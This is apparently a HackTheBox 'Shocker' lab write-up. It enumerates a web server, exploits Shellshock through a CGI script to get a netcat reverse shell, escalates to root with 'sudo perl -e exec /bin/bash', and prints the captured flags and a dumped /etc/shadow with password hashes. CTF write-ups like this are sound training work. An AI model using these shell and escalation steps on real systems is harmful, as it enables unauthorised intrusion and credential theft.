# HackTheBox - Shocker - 10.129.229.19

## Enumeration

- Nmap scan
```
Nmap scan report for 10.129.229.19
Host is up (0.62s latency).
Not shown: 65430 filtered tcp ports (no-response), 104 closed tcp ports (conn-refused)
PORT   STATE SERVICE    VERSION
80/tcp open  tcpwrapped
2222/tcp open  EtherNetIP-1
```

- Directory enumeration

```
$gobuster dir -u http://10.129.229.19 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.229.19
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 296]
/index.html           (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 301]

Progress: 4615 / 4615 (100.00%)
===============================================================
Finished
===============================================================

$gobuster dir -u http://10.129.229.19/cgi-bin -w /usr/share/wordlists/dirb/common.txt -x txt,sh,conf,html,js 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.229.19/cgi-bin
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,txt,sh,conf,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]

Progress: 27690 / 27690 (100.00%)
===============================================================
Finished
===============================================================

```

- On visiting http://10.129.229.19/cgi-bin/user.sh the file gets downloaded on to the system

```
$cat user.sh 
Content-Type: text/plain

Just an uptime test script

 06:10:52 up  1:16,  0 users,  load average: 0.00, 0.01, 0.00

```

- From here it was confusing where to advance, but I got a hint that it has got something to do with the machine's name `shellshock` :)

## RCE

Upon researching I found:

- Shellshock also known as Bashdoor, disclosed on 24th September 2014

- CVE-2014-6271

- Exploitation:

https://blog.cloudflare.com/inside-shellshock/


![Alt text](rce.png?raw=true "Rce")

- On the attacker machine start listener `nc -lnvp <port>`

```
 $nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.16.21] from (UNKNOWN) [10.129.229.19] 45382
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ id 
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
2339eb2297d62b935e05c9ccd46be729

```

## Privilege escalation

- On checking sudo privileges granted to `shelly` user

```
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

Refer to https://gtfobins.github.io/

```
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/bash";'
sudo perl -e 'exec "/bin/bash";'
whoami
root
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@Shocker:/usr/lib/cgi-bin# cd /root
root@Shocker:~# cat root.txt
ce15e2cd7b34bf39f31648e0d0ead5da

```

## Beyond root

- Shadow file

```
root:$6$BVgS5ne0$Q6rV3guK7QQUy7uRMwbQ3vv2Y5I9yQUhIzvrIhuiDso/o5UfDxZw7MMq8atR3UdJjhpkFVxVD0cVtjXQdPUAH.:17431:0:99999:7:::
daemon:*:17001:0:99999:7:::
bin:*:17001:0:99999:7:::
sys:*:17001:0:99999:7:::
sync:*:17001:0:99999:7:::
games:*:17001:0:99999:7:::
man:*:17001:0:99999:7:::
lp:*:17001:0:99999:7:::
mail:*:17001:0:99999:7:::
news:*:17001:0:99999:7:::
uucp:*:17001:0:99999:7:::
proxy:*:17001:0:99999:7:::
www-data:*:17001:0:99999:7:::
backup:*:17001:0:99999:7:::
list:*:17001:0:99999:7:::
irc:*:17001:0:99999:7:::
gnats:*:17001:0:99999:7:::
nobody:*:17001:0:99999:7:::
systemd-timesync:*:17001:0:99999:7:::
systemd-network:*:17001:0:99999:7:::
systemd-resolve:*:17001:0:99999:7:::
systemd-bus-proxy:*:17001:0:99999:7:::
syslog:*:17001:0:99999:7:::
_apt:*:17001:0:99999:7:::
lxd:*:17431:0:99999:7:::
messagebus:*:17431:0:99999:7:::
uuidd:*:17431:0:99999:7:::
dnsmasq:*:17431:0:99999:7:::
sshd:*:17431:0:99999:7:::
shelly:$6$aYLAoDIC$CJ8f8WSCT6GYmbx7x8z5RfrbTG5mpDkkJkLW097hoiEw3tqei2cE7EcUTYdJTVMSa3PALZeBHjhiFR8Ba5jzf0:17431:0:99999:7:::
```